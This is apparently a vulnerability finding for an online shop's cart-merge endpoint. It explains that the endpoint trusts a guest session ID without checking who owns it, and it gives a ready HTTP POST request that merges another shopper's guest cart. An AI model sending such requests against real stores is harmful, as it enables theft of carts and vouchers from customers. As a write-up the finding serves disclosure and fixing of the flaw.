diagnosis: The cart merge endpoint transfers cart contents from a guest session to the authenticated user's cart in Redis. Because guestSessionId is trusted without verifying that the caller initiated the guest session or holds the guest session cookie, an attacker can brute-force guest IDs to steal items, apply promotional voucher states, or empty carts of active shoppers.
exploit_request:
POST /api/cart/merge HTTP/1.1
Host: shop.megastore.com
Authorization: Bearer <customer_jwt>
Content-Type: application/json

{"guestSessionId": "guest_sess_high_value_shopper_01"}
